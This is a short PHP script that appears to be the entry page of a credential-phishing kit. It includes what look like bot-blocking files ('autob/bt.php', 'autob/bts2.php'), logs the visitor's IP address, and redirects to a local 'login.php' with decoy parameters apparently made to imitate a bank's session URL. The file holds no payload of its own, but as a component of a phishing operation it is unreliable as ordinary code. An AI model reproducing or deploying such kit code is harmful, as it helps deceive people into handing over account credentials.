<?php
session_start();
include 'autob/bt.php';
include "autob/bts2.php";
$ib = $_SERVER['REMOTE_ADDR'];
$random=rand(0,100000);
$ran = md5($random);
$d=dirname($_SERVER['PHP_SELF']);
header("Location:".$d."/login.php?ScrPg=".$ib."&ACCT.x=ID-DL=WF324=".$ran);
?>